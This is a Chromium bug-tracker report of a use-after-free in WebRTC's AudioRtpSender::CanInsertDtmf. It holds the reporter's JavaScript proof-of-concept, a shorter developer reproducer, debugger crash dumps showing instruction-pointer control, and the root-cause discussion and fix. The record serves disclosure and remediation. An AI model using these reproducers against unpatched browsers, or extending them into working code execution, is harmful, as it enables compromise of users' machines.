# Security: WebRtc - Use After Free in AudioRtpSender::CanInsertDtmf()

| Field | Value |
|-------|-------|
| **Issue ID** | [40090823](https://issues.chromium.org/issues/40090823) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>WebRTC>PeerConnection |
| **Platforms** | Linux, Windows |
| **Reporter** | lo...@gmail.com |
| **Assignee** | st...@chromium.org |
| **Created** | 2018-03-16 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**

```
Steps to reproduce:  
  
1.Open PoC UAF_CanInsertDtmf_PoC.html in Chrome browser.  
2.Chrome crashes in AudioRtpSender::CanInsertDtmf() by executing corrupted EIP becuase of a Use After Free.  

	(5044.32e8): Access violation - code c0000005 (!!! second chance !!!)  
	eax=0b6dc8c8 ebx=0b24f460 ecx=0b6d2df8 edx=1362e8b0 esi=0b24f540 edi=0a12fd60  
	eip=436f6900 esp=0b34f554 ebp=0b34f55c iopl=0         nv up ei pl zr na pe nc  
	cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
	436f6900 ??              ???  

```

**VERSION**  

Chrome Version: Google Chrome 66.0.3359.26 (Official Build) dev (32-bit) (cohort: Dev)  

Operating System: Windows 10

**REPRODUCTION CASE** (UAF\_CanInsertDtmf\_PoC.html)  

<script>  

var context = new AudioContext();  

var streamDestNode = context.createMediaStreamDestination();  

var rtcConfig = { "iceServers": [{ "urls": "stun:stun2.l.google.com:19302" }, ] };  

var options = {optional:[{DtlsSrtpKeyAgreement:false}, {RtpDataChannels: true}]};  

var pc0 = new RTCPeerConnection(rtcConfig,options);  

var rtpSender = pc0.addTrack(streamDestNode.stream.getTracks()[0], streamDestNode.stream);  

var pc1 = new RTCPeerConnection(rtcConfig,options);  

pc1.addTrack(streamDestNode.stream.getTracks()[0], streamDestNode.stream);  

var dtmfSender = pc0.getSenders()[0].dtmf;  

pc1.createOffer(function(offer) {pc0.setLocalDescription(offer);  

pc0.removeTrack(rtpSender);  

pc0.close();  

dtmfSender.insertDTMF("aABc8bb", 54,159);  

}, function(e) {});  

</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
(5044.32e8): Access violation - code c0000005 (!!! second chance !!!)  
eax=0b6dc8c8 ebx=0b24f460 ecx=0b6d2df8 edx=1362e8b0 esi=0b24f540 edi=0a12fd60  
eip=436f6900 esp=0b34f554 ebp=0b34f55c iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
436f6900 ??              ???  
7:100> !analyze -v  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\*                                                                             \*  
\*                        Exception Analysis                                   \*  
\*                                                                             \*  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

GetUrlPageData2 (WinHttp) failed: 12002.  

DUMP_CLASS: 2  

DUMP_QUALIFIER: 0  

FAULTING_IP:   
+0  
436f6900 ??              ???  

EXCEPTION_RECORD:  (.exr -1)  
ExceptionAddress: 436f6900  
   ExceptionCode: c0000005 (Access violation)  
  ExceptionFlags: 00000000  
NumberParameters: 2  
   Parameter[0]: 00000008  
   Parameter[1]: 436f6900  
Attempt to execute non-executable address 436f6900  

FAULTING_THREAD:  000032e8  

DEFAULT_BUCKET_ID:  SOFTWARE_NX_FAULT  

PROCESS_NAME:  chrome.exe  

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.  

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.  

EXCEPTION_CODE_STR:  c0000005  

EXCEPTION_PARAMETER1:  00000008  

EXCEPTION_PARAMETER2:  436f6900  

FOLLOWUP_IP:   
chrome_child!rtc::FunctorMessageHandler<bool,`lambda at ../../third_party/webrtc/pc/rtpsender.cc:109:22'>::OnMessage+11 [C:\b\c\b\win_clang\src\third_party\webrtc\rtc_base\messagehandler.h @ 44]  
124c5c3d 884608          mov     byte ptr [esi+8],al  

EXECUTE_ADDRESS: 436f6900  

FAILED_INSTRUCTION_ADDRESS:   
+0  
436f6900 ??              ???  

WATSON_BKT_PROCSTAMP:  5aa4b71c  

WATSON_BKT_PROCVER:  66.0.3359.26  

PROCESS_VER_PRODUCT:  Google Chrome  

WATSON_BKT_MODULE:  unknown  

WATSON_BKT_MODVER:  0.0.0.0  

WATSON_BKT_MODOFFSET:  436f6900  

WATSON_BKT_MODSTAMP:  bbbbbbb4  

BUILD_VERSION_STRING:  10.0.16299.15 (WinBuild.160101.0800)  

MODLIST_WITH_TSCHKSUM_HASH:  0adc1ecee8c24594312955e593ac05acf70206be  

MODLIST_SHA1_HASH:  1b14ff51da1775d284cca31e92ffa437fca47283  

NTGLOBALFLAG:  0  

PROCESS_BAM_CURRENT_THROTTLED: 0  

PROCESS_BAM_PREVIOUS_THROTTLED: 0  

APPLICATION_VERIFIER_FLAGS:  0  

PRODUCT_TYPE:  1  

SUITE_MASK:  784  

DUMP_TYPE:  fe  

ANALYSIS_SESSION_HOST:  DESKTOP-42C0TR5  

ANALYSIS_SESSION_TIME:  03-16-2018 10:23:19.0885  

ANALYSIS_VERSION: 10.0.15063.468 x86fre  

IP_ON_HEAP:  436f6900  
The fault address in not in any loaded module, please check your build's rebase  
log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may  
contain the address if it were loaded.  

IP_IN_FREE_BLOCK: 436f6900  

THREAD_ATTRIBUTES:   
OS_LOCALE:  ENZ  

PROBLEM_CLASSES:   

	ID:     [0n292]  
	Type:   [@ACCESS_VIOLATION]  
	Class:  Addendum  
	Scope:  BUCKET_ID  
	Name:   Omit  
	Data:   Omit  
	PID:    [Unspecified]  
	TID:    [0x32e8]  
	Frame:  [0] : unknown!unknown  

	ID:     [0n266]  
	Type:   [INVALID_POINTER_EXECUTE]  
	Class:  Primary  
	Scope:  BUCKET_ID  
	Name:   Add  
	Data:   Omit  
	PID:    [Unspecified]  
	TID:    [0x32e8]  
	Frame:  [0] : unknown!unknown  

	ID:     [0n274]  
	Type:   [SOFTWARE_NX_FAULT]  
	Class:  Primary  
	Scope:  DEFAULT_BUCKET_ID (Failure Bucket ID prefix)  
			BUCKET_ID  
	Name:   Add  
	Data:   Omit  
	PID:    [0x5044]  
	TID:    [0x32e8]  
	Frame:  [0] : unknown!unknown  

BUGCHECK_STR:  APPLICATION_FAULT_SOFTWARE_NX_FAULT_INVALID_POINTER_EXECUTE  

PRIMARY_PROBLEM_CLASS:  APPLICATION_FAULT  

LAST_CONTROL_TRANSFER:  from 124c5c3d to 436f6900  

STACK_TEXT:    
WARNING: Frame IP not in any known module. Following frames may be wrong.  
0b34f550 124c5c3d 1384ea54 0b34f5d0 124d621c 0x436f6900  
0b34f55c 124d621c 0b24f460 0a1f6448 0b6d9878 chrome_child!rtc::FunctorMessageHandler<bool,`lambda at ../../third_party/webrtc/pc/rtpsender.cc:109:22'>::OnMessage+0x11  
0b34f5d0 124d6595 0b24f460 0a12fd68 0b34f618 chrome_child!jingle_glue::JingleThreadWrapper::Dispatch+0x3a  
0b34f5ec 0fdabb4f 0b701d90 00000000 00000000 chrome_child!jingle_glue::JingleThreadWrapper::ProcessPendingSends+0x65  
0b34f654 0fdabaa3 12ff33a4 0b34f710 0b34f6e8 chrome_child!base::debug::TaskAnnotator::RunTask+0x9f  
0b34f664 0fdab7a6 0b34f710 1362e916 077e6388 chrome_child!base::internal::IncomingTaskQueue::RunTask+0x13  
0b34f6e8 0fdab5c3 0b34f710 0fda9acc 48ca6493 chrome_child!base::MessageLoop::RunTask+0x1b6  
0b34f708 0fda2b13 00000000 12ea90e9 1362e916 chrome_child!base::MessageLoop::DeferOrRunPendingTask+0x53  
0b34f7b8 0fda2a27 0a1f67d0 0a1f67c8 077e631c chrome_child!base::MessageLoop::DoWork+0xd3  
0b34f7d4 0fda297f 077e6318 0b34f814 0b34f7f4 chrome_child!base::MessagePumpDefault::Run+0x87  
0b34f7e4 0fda27de 00000001 0a109894 0b34f7fc chrome_child!base::MessageLoop::Run+0x1f  
0b34f7f4 0fda27ab 0b34f83c 0fda1f35 0b34f814 chrome_child!base::RunLoop::Run+0x2e  
0b34f7fc 0fda1f35 0b34f814 077e6318 00000000 chrome_child!base::Thread::Run+0xb  
0b34f83c 10fec94b 0a109894 000004e8 000004e8 chrome_child!base::Thread::ThreadMain+0x155  
0b34f860 743f8654 0a1ebe78 743f8630 bf0fd42e chrome_child!base::`anonymous namespace'::ThreadFunc+0xbb  
0b34f874 76f94a77 0a1ebe78 c3583ea9 00000000 KERNEL32!BaseThreadInitThunk+0x24  
0b34f8bc 76f94a47 ffffffff 76fb9ea4 00000000 ntdll!__RtlUserThreadStart+0x2f  
0b34f8cc 00000000 10fec890 0a1ebe78 00000000 ntdll!_RtlUserThreadStart+0x1b  


THREAD_SHA1_HASH_MOD_FUNC:  0e2726c6a794a3815b05ad3872caf80dda46aed3  

THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  b11a69436773973c1b33f68088e39dfe7dbf5e8c  

THREAD_SHA1_HASH_MOD:  96b3a5f2ba4c9427109193978b1e36af4a0ac59b  

FAULT_INSTR_CODE:  5e084688  

FAULTING_SOURCE_LINE:  C:\b\c\b\win_clang\src\third_party\webrtc\rtc_base\messagehandler.h  

FAULTING_SOURCE_FILE:  C:\b\c\b\win_clang\src\third_party\webrtc\rtc_base\messagehandler.h  

FAULTING_SOURCE_LINE_NUMBER:  44  

SYMBOL_STACK_INDEX:  1  

SYMBOL_NAME:  chrome_child!rtc::FunctorMessageHandler<bool,`lambda at ../../third_party/webrtc/pc/rtpsender.cc:109:22'>::OnMessage+11  

FOLLOWUP_NAME:  MachineOwner  

MODULE_NAME: chrome_child  

IMAGE_NAME:  chrome_child.dll  

DEBUG_FLR_IMAGE_TIMESTAMP:  5aa4b6e7  

STACK_COMMAND:  ~100s ; kb  

FAILURE_BUCKET_ID:  SOFTWARE_NX_FAULT_c0000005_chrome_child.dll!rtc::FunctorMessageHandler_bool,_lambda_at_.._.._third_party_webrtc_pc_rtpsender.cc:109:22__::OnMessage  

BUCKET_ID:  APPLICATION_FAULT_SOFTWARE_NX_FAULT_INVALID_POINTER_EXECUTE_BAD_IP_chrome_child!rtc::FunctorMessageHandler_bool,_lambda_at_.._.._third_party_webrtc_pc_rtpsender.cc:109:22__::OnMessage+11  

FAILURE_EXCEPTION_CODE:  c0000005  

FAILURE_IMAGE_NAME:  chrome_child.dll  

BUCKET_ID_IMAGE_STR:  chrome_child.dll  

FAILURE_MODULE_NAME:  chrome_child  

BUCKET_ID_MODULE_STR:  chrome_child  

FAILURE_FUNCTION_NAME:  rtc::FunctorMessageHandler_bool,_lambda_at_.._.._third_party_webrtc_pc_rtpsender.cc:109:22__::OnMessage  

BUCKET_ID_FUNCTION_STR:  rtc::FunctorMessageHandler_bool,_lambda_at_.._.._third_party_webrtc_pc_rtpsender.cc:109:22__::OnMessage  

BUCKET_ID_OFFSET:  11  

BUCKET_ID_MODTIMEDATESTAMP:  5aa4b6e7  

BUCKET_ID_MODCHECKSUM:  3cecbcf  

BUCKET_ID_MODVER_STR:  66.0.3359.26  

BUCKET_ID_PREFIX_STR:  APPLICATION_FAULT_SOFTWARE_NX_FAULT_INVALID_POINTER_EXECUTE_BAD_IP_  

FAILURE_PROBLEM_CLASS:  APPLICATION_FAULT  

FAILURE_SYMBOL_NAME:  chrome_child.dll!rtc::FunctorMessageHandler_bool,_lambda_at_.._.._third_party_webrtc_pc_rtpsender.cc:109:22__::OnMessage  

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/chrome.exe/66.0.3359.26/5aa4b71c/unknown/0.0.0.0/bbbbbbb4/c0000005/436f6900.htm?Retriage=1  

TARGET_TIME:  2018-03-16T17:23:29.000Z  

OSBUILD:  16299  

OSSERVICEPACK:  15  

SERVICEPACK_NUMBER: 0  

OS_REVISION: 0  

OSPLATFORM_TYPE:  x86  

OSNAME:  Windows 10  

OSEDITION:  Windows 10 WinNt SingleUserTS Personal  

USER_LCID:  0  

OSBUILD_TIMESTAMP:  2031-10-26 19:56:14  

BUILDDATESTAMP_STR:  160101.0800  

BUILDLAB_STR:  WinBuild  

BUILDOSVER_STR:  10.0.16299.15  

ANALYSIS_SESSION_ELAPSED_TIME:  7868  

ANALYSIS_SOURCE:  UM  

FAILURE_ID_HASH_STRING:  um:software_nx_fault_c0000005_chrome_child.dll!rtc::functormessagehandler_bool,_lambda_at_.._.._third_party_webrtc_pc_rtpsender.cc:109:22__::onmessage  

FAILURE_ID_HASH:  {00c89743-c68f-1113-9abe-6427c60f7158}  

Followup:     MachineOwner  
---------  

```

## Attachments

- [UAF_CanInsertDtmf_PoC.html](attachments/UAF_CanInsertDtmf_PoC.html) (text/plain, 762 B)
- [UAF_CanInsertDtmf_PoC_EIP_41414141.html](attachments/UAF_CanInsertDtmf_PoC_EIP_41414141.html) (text/plain, 1.1 KB)

## Timeline

### cl...@chromium.org (2018-03-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5349464630624256.

### el...@chromium.org (2018-03-16)

Thanks for the report!

[Monorail components: Blink>WebRTC]

### lo...@gmail.com (2018-03-16)

Attached A PoC with EIP control.

Chrome Version: Google Chrome	66.0.3359.26 (Official Build) dev (32-bit) (cohort: Dev)
Operating System: Windows 10

(3a00.2984): Access violation - code c0000005 (!!! second chance !!!)
eax=0ab10ad8 ebx=0b27fa60 ecx=0ac298b0 edx=1292e8b0 esi=0b27fb40 edi=0aa7b898
eip=41414141 esp=0b37f99c ebp=0b37f9a4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
41414141 ??              ???
6:062> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

GetUrlPageData2 (WinHttp) failed: 12002.

DUMP_CLASS: 2

DUMP_QUALIFIER: 0

FAULTING_IP: 
unknown!noop+0
41414141 ??              ???

EXCEPTION_RECORD:  (.exr -1)
ExceptionAddress: 41414141
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000008
   Parameter[1]: 41414141
Attempt to execute non-executable address 41414141

FAULTING_THREAD:  00002984

DEFAULT_BUCKET_ID:  SOFTWARE_NX_FAULT

PROCESS_NAME:  chrome.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE_STR:  c0000005

EXCEPTION_PARAMETER1:  00000008

EXCEPTION_PARAMETER2:  41414141

FOLLOWUP_IP: 
unknown!noop+0
41414141 ??              ???

EXECUTE_ADDRESS: 41414141

FAILED_INSTRUCTION_ADDRESS: 
unknown!noop+0
41414141 ??              ???

WATSON_BKT_PROCSTAMP:  5aa4b71c

WATSON_BKT_PROCVER:  66.0.3359.26

PROCESS_VER_PRODUCT:  Google Chrome

WATSON_BKT_MODULE:  unknown

WATSON_BKT_MODVER:  0.0.0.0

WATSON_BKT_MODOFFSET:  41414141

WATSON_BKT_MODSTAMP:  bbbbbbb4

BUILD_VERSION_STRING:  10.0.16299.15 (WinBuild.160101.0800)

MODLIST_WITH_TSCHKSUM_HASH:  0adc1ecee8c24594312955e593ac05acf70206be

MODLIST_SHA1_HASH:  1b14ff51da1775d284cca31e92ffa437fca47283

NTGLOBALFLAG:  0

PROCESS_BAM_CURRENT_THROTTLED: 0

PROCESS_BAM_PREVIOUS_THROTTLED: 0

APPLICATION_VERIFIER_FLAGS:  0

PRODUCT_TYPE:  1

SUITE_MASK:  784

DUMP_TYPE:  fe

ANALYSIS_SESSION_HOST:  DESKTOP-42C0TR5

ANALYSIS_SESSION_TIME:  03-16-2018 10:13:57.0922

ANALYSIS_VERSION: 10.0.15063.468 x86fre

IP_ON_HEAP:  41414141
The fault address in not in any loaded module, please check your build's rebase
log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may
contain the address if it were loaded.

IP_IN_FREE_BLOCK: 41414141

THREAD_ATTRIBUTES: 
OS_LOCALE:  ENZ

PROBLEM_CLASSES: 

    ID:     [0n292]
    Type:   [@ACCESS_VIOLATION]
    Class:  Addendum
    Scope:  BUCKET_ID
    Name:   Omit
    Data:   Omit
    PID:    [Unspecified]
    TID:    [0x2984]
    Frame:  [0] : unknown!noop

    ID:     [0n266]
    Type:   [INVALID_POINTER_EXECUTE]
    Class:  Primary
    Scope:  BUCKET_ID
    Name:   Add
    Data:   Omit
    PID:    [Unspecified]
    TID:    [0x2984]
    Frame:  [0] : unknown!noop

    ID:     [0n274]
    Type:   [SOFTWARE_NX_FAULT]
    Class:  Primary
    Scope:  DEFAULT_BUCKET_ID (Failure Bucket ID prefix)
            BUCKET_ID
    Name:   Add
    Data:   Omit
    PID:    [0x3a00]
    TID:    [0x2984]
    Frame:  [0] : unknown!noop

    ID:     [0n271]
    Type:   [FILL_PATTERN]
    Class:  Primary
    Scope:  BUCKET_ID
    Name:   Add
    Data:   Omit
    PID:    [0x3a00]
    TID:    [0x2984]
    Frame:  [0] : unknown!noop

BUGCHECK_STR:  APPLICATION_FAULT_SOFTWARE_NX_FAULT_FILL_PATTERN_INVALID_POINTER_EXECUTE

PRIMARY_PROBLEM_CLASS:  APPLICATION_FAULT

LAST_CONTROL_TRANSFER:  from 117c5c3d to 41414141

STACK_TEXT:  
WARNING: Frame IP not in any known module. Following frames may be wrong.
0b37f998 117c5c3d 12b4ea54 0b37fa18 117d621c 0x41414141
0b37f9a4 117d621c 0b27fa60 073f56d0 0c162d80 chrome_child!rtc::FunctorMessageHandler<bool,`lambda at ../../third_party/webrtc/pc/rtpsender.cc:109:22'>::OnMessage+0x11
0b37fa18 117d6595 0b27fa60 0aa7b8a0 0b37fa60 chrome_child!jingle_glue::JingleThreadWrapper::Dispatch+0x3a
0b37fa34 0f0abb4f 0ac33dd0 00000000 00000000 chrome_child!jingle_glue::JingleThreadWrapper::ProcessPendingSends+0x65
0b37fa9c 0f0abaa3 122f33a4 0b37fb58 0b37fb30 chrome_child!base::debug::TaskAnnotator::RunTask+0x9f
0b37faac 0f0ab7a6 0b37fb58 1292e916 073e0230 chrome_child!base::internal::IncomingTaskQueue::RunTask+0x13
0b37fb30 0f0ab5c3 0b37fb58 0f0a9acc 639cdb25 chrome_child!base::MessageLoop::RunTask+0x1b6
0b37fb50 0f0a2b13 00000000 121a90e9 1292e916 chrome_child!base::MessageLoop::DeferOrRunPendingTask+0x53
0b37fbfc 0f0a2a27 07444c70 07444c68 073e01c4 chrome_child!base::MessageLoop::DoWork+0xd3
0b37fc18 0f0a297f 073e01c0 0b37fc58 0b37fc38 chrome_child!base::MessagePumpDefault::Run+0x87
0b37fc28 0f0a27de 00000001 07458774 0b37fc40 chrome_child!base::MessageLoop::Run+0x1f
0b37fc38 0f0a27ab 0b37fc80 0f0a1f35 0b37fc58 chrome_child!base::RunLoop::Run+0x2e
0b37fc40 0f0a1f35 0b37fc58 073e01c0 00000000 chrome_child!base::Thread::Run+0xb
0b37fc80 102ec94b 07458774 000004e8 000004e8 chrome_child!base::Thread::ThreadMain+0x155
0b37fca4 743f8654 073cb380 743f8630 a10cd803 chrome_child!base::`anonymous namespace'::ThreadFunc+0xbb
0b37fcb8 76f94a77 073cb380 d477db95 00000000 KERNEL32!BaseThreadInitThunk+0x24
0b37fd00 76f94a47 ffffffff 76fb9ea6 00000000 ntdll!__RtlUserThreadStart+0x2f
0b37fd10 00000000 102ec890 073cb380 00000000 ntdll!_RtlUserThreadStart+0x1b


THREAD_SHA1_HASH_MOD_FUNC:  660e762e4c322a2b5c74ebb623752a656567dfe4

THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  3d3da0b04a08312b900d83e9357a11a5fdf77a5d

THREAD_SHA1_HASH_MOD:  425ff9e325739bce53f344710fb62e0126072718

SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  unknown!noop+0

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: unknown

IMAGE_NAME:  unknown.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  0

STACK_COMMAND:  ~62s ; kb

FAILURE_BUCKET_ID:  SOFTWARE_NX_FAULT_c0000005_unknown.dll!noop

BUCKET_ID:  APPLICATION_FAULT_SOFTWARE_NX_FAULT_FILL_PATTERN_INVALID_POINTER_EXECUTE_BAD_IP_unknown!noop+0

FAILURE_EXCEPTION_CODE:  c0000005

FAILURE_IMAGE_NAME:  unknown.dll

BUCKET_ID_IMAGE_STR:  unknown.dll

FAILURE_MODULE_NAME:  unknown

BUCKET_ID_MODULE_STR:  unknown

FAILURE_FUNCTION_NAME:  noop

BUCKET_ID_FUNCTION_STR:  noop

BUCKET_ID_OFFSET:  0

BUCKET_ID_MODTIMEDATESTAMP:  0

BUCKET_ID_MODCHECKSUM:  0

BUCKET_ID_MODVER_STR:  0.0.0.0

BUCKET_ID_PREFIX_STR:  APPLICATION_FAULT_SOFTWARE_NX_FAULT_FILL_PATTERN_INVALID_POINTER_EXECUTE_BAD_IP_

FAILURE_PROBLEM_CLASS:  APPLICATION_FAULT

FAILURE_SYMBOL_NAME:  unknown.dll!noop

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/chrome.exe/66.0.3359.26/5aa4b71c/unknown/0.0.0.0/bbbbbbb4/c0000005/41414141.htm?Retriage=1

TARGET_TIME:  2018-03-16T17:14:30.000Z

OSBUILD:  16299

OSSERVICEPACK:  15

SERVICEPACK_NUMBER: 0

OS_REVISION: 0

OSPLATFORM_TYPE:  x86

OSNAME:  Windows 10

OSEDITION:  Windows 10 WinNt SingleUserTS Personal

USER_LCID:  0

OSBUILD_TIMESTAMP:  2031-10-26 19:56:14

BUILDDATESTAMP_STR:  160101.0800

BUILDLAB_STR:  WinBuild

BUILDOSVER_STR:  10.0.16299.15

ANALYSIS_SESSION_ELAPSED_TIME:  d23e

ANALYSIS_SOURCE:  UM

FAILURE_ID_HASH_STRING:  um:software_nx_fault_c0000005_unknown.dll!noop

FAILURE_ID_HASH:  {831d0811-1ea2-ade7-1bca-bc3a623ec739}

Followup:     MachineOwner
---------


### cl...@chromium.org (2018-03-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4916778552262656.

### es...@chromium.org (2018-03-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-03-17)

Detailed report: https://clusterfuzz.com/testcase?key=4916778552262656

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x616000084680
Crash State:
  rtc::FunctorMessageHandler<bool, webrtc::AudioRtpSender::CanInsertDtmf
  jingle_glue::JingleThreadWrapper::Dispatch
  jingle_glue::JingleThreadWrapper::ProcessPendingSends
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=538781:538782

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4916778552262656

See https://github.com/google/clusterfuzz-tools for more information.

### sh...@chromium.org (2018-03-17)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### es...@chromium.org (2018-03-17)

hta, please took a look, like related to https://chromium-review.googlesource.com/926181.

### es...@chromium.org (2018-03-17)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-03-18)

Detailed report: https://clusterfuzz.com/testcase?key=5349464630624256

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x616000084680
Crash State:
  rtc::FunctorMessageHandler<bool, webrtc::AudioRtpSender::CanInsertDtmf
  jingle_glue::JingleThreadWrapper::Dispatch
  jingle_glue::JingleThreadWrapper::ProcessPendingSends
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=538781:538782

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5349464630624256

See https://github.com/google/clusterfuzz-tools for more information.

### cl...@chromium.org (2018-03-18)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Core]

### ht...@chromium.org (2018-03-19)

Shorter repro. It reproduces in content_shell.

<script>
  var context = new AudioContext();
  var streamDestNode  = context.createMediaStreamDestination();
  var pc0 = new RTCPeerConnection();
  var rtpSender = pc0.addTrack(streamDestNode.stream.getTracks()[0]);
  var dtmfSender = pc0.getSenders()[0].dtmf;
  pc0.createOffer(function(offer) {
    pc0.setLocalDescription(offer);
    pc0.removeTrack(rtpSender);
    pc0.close();
    dtmfSender.insertDTMF("a");
  }, function(e) {});
</script>


[Monorail components: -Blink>WebRTC -Internals>Core Blink>WebRTC>PeerConnection]

### ht...@chromium.org (2018-03-19)

Cause seems to be that RtpTransceiver::RemoveSender erases the sender from senders_ without nulling out the sender's media_channel_ by calling SetVoiceMediaChannel(null).

At close, the media channel is (I think) set to null for all senders in senders_.

### ht...@chromium.org (2018-03-19)

This seems to be the line:

https://cs.chromium.org/chromium/src/third_party/webrtc/pc/rtptransceiver.cc?dr=CSs&l=109

@steveanton, can you take a look?
The ownership of the VoiceMediaChannel object doesn't seem clear to me, I'm not sure whether this piece of code should clear the pointer or delete the object.


### ht...@chromium.org (2018-03-19)

Setting media_channel_ to nullptr in AudioRtpSender::Stop() will fix the problem. But the question of ownership needs addressing.


### bu...@chromium.org (2018-03-19)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/3d976f60666c0d800f9112edbae7c93bee99acd7

commit 3d976f60666c0d800f9112edbae7c93bee99acd7
Author: Harald Alvestrand <hta@webrtc.org>
Date: Mon Mar 19 18:39:01 2018

Discard link to media channel when audio sender stopped.

Bug: chromium:822799
Change-Id: Ib863cf048318b04369cc51ed1b1c8b03010a2fd2
Reviewed-on: https://webrtc-review.googlesource.com/62941
Commit-Queue: Harald Alvestrand <hta@webrtc.org>
Reviewed-by: Steve Anton <steveanton@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#22503}
[modify] https://crrev.com/3d976f60666c0d800f9112edbae7c93bee99acd7/pc/rtpsender.cc


### st...@chromium.org (2018-03-19)

Yeah, there's basically two parallel hierarchies of objects in the API: "BaseChannels/MediaChannels (1-1)" and "RtpTransceivers/RtpSenders/RtpReceivers". The former live only as long as needed as dictated by calls to SLD/SRD (and not by AddTrack/RemoveTrack). The latter generally will outlive the former, but this is not always the case in Plan B.

This is also made complicated by there being 3 different ways to destroy the MediaChannel: by a call to SLD/SRD, by a call to close, or (with Unified Plan) a call to RtpTransceiver::Stop().

The fix Harald landed should address the security issue, but I'll work on adding more tests to guard against this coming back in the future and try simplifying the ownership model.

### bu...@chromium.org (2018-03-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/345d5f1b785f1d80d9d07d4b70811f61756b99d6

commit 345d5f1b785f1d80d9d07d4b70811f61756b99d6
Author: webrtc-chromium-autoroll@skia-buildbots.google.com.iam.gserviceaccount.com <webrtc-chromium-autoroll@skia-buildbots.google.com.iam.gserviceaccount.com>
Date: Tue Mar 20 14:02:47 2018

Roll src/third_party/webrtc/ d2c8332e2..9047dac75 (23 commits)

https://webrtc.googlesource.com/src.git/+log/d2c8332e2b03..9047dac7576d

$ git log d2c8332e2..9047dac75 --date=short --no-merges --format='%ad %ae %s'

Created with:
  roll-dep src/third_party/webrtc
BUG=chromium:None,chromium:None,chromium:None,chromium:822799,chromium:680172,chromium:None,chromium:755660,chromium:None,chromium:None,chromium:None,chromium:755660


The AutoRoll server is located here: https://webrtc-chromium-roll.skia.org

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.


CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_chromium_archive_rel_ng;master.tryserver.chromium.mac:mac_chromium_archive_rel_ng;master.tryserver.chromium.win:win-msvc-dbg
TBR=webrtc-chromium-sheriffs-robots@google.com

Change-Id: Ia063873eca78ba81cec927cf4374423586bb338f
Reviewed-on: https://chromium-review.googlesource.com/970723
Commit-Queue: webrtc-chromium-autoroll <webrtc-chromium-autoroll@skia-buildbots.google.com.iam.gserviceaccount.com>
Reviewed-by: webrtc-chromium-autoroll <webrtc-chromium-autoroll@skia-buildbots.google.com.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#544347}
[modify] https://crrev.com/345d5f1b785f1d80d9d07d4b70811f61756b99d6/DEPS


### cl...@chromium.org (2018-03-21)

ClusterFuzz has detected this issue as fixed in range 544346:544347.

